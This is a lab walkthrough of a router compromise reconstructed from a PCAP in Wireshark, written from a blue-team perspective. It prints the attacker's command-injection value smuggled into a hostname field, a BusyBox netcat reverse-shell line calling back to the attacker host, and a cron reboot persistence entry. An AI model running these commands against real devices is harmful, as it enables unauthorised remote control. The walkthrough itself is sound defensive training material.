# BTLO Walkthrough – Trend Router Compromise

> **Lab:** Trend  
> **Platform:** Blue Team Labs Online (BTLO)  
> **Focus:** Network Traffic Analysis, Command Injection, Post-Exploitation, Persistence

---

## 1. Lab Overview

This lab simulates the compromise of a network router through its web management interface. The objective is to analyse a provided PCAP file to identify:

* The source of the attack
* The vulnerable endpoint
* Credential exposure
* Command injection and post-exploitation activity
* Persistence mechanisms

All analysis was performed using **Wireshark**.

---

## 2. Initial Traffic Analysis

The provided capture (`Trend.pcap`) was loaded into Wireshark. Initial inspection focused on HTTP traffic, as routers often expose web-based management interfaces.

A display filter was applied to isolate HTTP POST requests:

```
http.request.method == "POST"
```

This immediately revealed repeated POST requests to several router endpoints, most notably:

* `/login.ccp`
* `/get_set.ccp`

📸 **Screenshot:** `Screenshots/vulnerable-endpoint-get-set-ccp.png`

---

## 3. Attacker Source Identification

By inspecting the source and destination fields of the HTTP POST traffic, the attacker IP address was identified as:

* **Attacker IP:** `192.168.10.2`
* **Target (Router):** `192.168.10.1`

📸 **Screenshot:** `Screenshots/attacker-source-ip.png`

This confirms that the attacker is operating from within the same internal network.

---

## 4. Credential Exposure (Cleartext Login)

Following the `/login.ccp` POST requests and using **Follow → TCP Stream**, login attempts were reconstructed.

The HTTP payload revealed credentials transmitted in **cleartext**:

* **Username:** `admin`
* **Password:** `admin`

This indicates a lack of HTTPS/TLS protection on the management interface.

📸 **Screenshot:** `Screenshots/login-cleartext-credentials.png`

---

## 5. Successful Authentication

After multiple login attempts, a successful authentication was observed. The server response returned a redirect indicating a valid login session.

📸 **Screenshot:** `Screenshots/login-success-redirect.png`

This confirms the attacker gained authenticated access to the router’s web interface.

---

## 6. Command Injection via get_set.ccp

Further inspection of POST requests to `/get_set.ccp` revealed user-controlled parameters being abused to inject system commands.

An example malicious parameter value included:

```
lanHostCfg_HostName_1.1.1.0="; mkdir test"
```

This demonstrates classic **command injection**, where shell commands are appended to a configuration parameter.

📸 **Screenshot:** `Screenshots/command-injection-parameter.png`

---

## 7. Initial Command Execution

Following the injection, command execution was confirmed by observing filesystem interaction through subsequent responses.

The attacker successfully executed:

```
mkdir test
```

📸 **Screenshot:** `Screenshots/initial-command-mkdir-test.png`

This validated remote code execution on the router.

---

## 8. Post-Exploitation Activity

The attacker proceeded with post-exploitation reconnaissance by executing:

```
whoami
```

The output confirmed execution context on the router system.

📸 **Screenshot:** `Screenshots/post-exploitation-whoami.png`

---

## 9. Reverse Shell Establishment

Further payloads revealed the use of **BusyBox netcat** to establish a reverse shell:

```
busybox nc 192.168.10.2 4444 -e /bin/sh
```

Network-level confirmation was achieved by filtering for TCP SYN packets on port 4444:

```
tcp.port == 4444 && tcp.flags.syn == 1
```

📸 **Screenshots:**

* `Screenshots/reverse-shell-command.png`
* `Screenshots/tcp-4444-reverse-shell-established.png`

This confirms interactive remote access was obtained.

---

## 10. Persistence Mechanism

To maintain access, the attacker modified the router’s cron configuration:

```
@reboot /tmp/shell.sh
```

This ensures the malicious shell script executes automatically on every reboot.

📸 **Screenshot:** `Screenshots/cron-persistence-reboot.png`

---

## 11. Device Fingerprinting

Additional traffic revealed device metadata, including:

* Firmware version
* Device model details

This information could be used for tailored exploitation or lateral movement.

📸 **Screenshots:**

* `Screenshots/device-firmware-version.png`
* `Screenshots/device-model-details.png`

---

## 12. Conclusion

This lab demonstrates a full compromise chain:

1. Cleartext credential exposure
2. Successful authentication
3. Command injection vulnerability
4. Remote code execution
5. Reverse shell establishment
6. Persistence via cron

### Key Takeaways:

* Exposed management interfaces without TLS are high-risk
* Input validation failures lead directly to RCE
* Network traffic analysis alone can fully reconstruct an attack timeline

---

## Tools Used

* Wireshark
* Blue Team Labs Online (BTLO)

---

**Author:** Teodor Todorov  
**Goal:** SOC Analyst / Blue Team
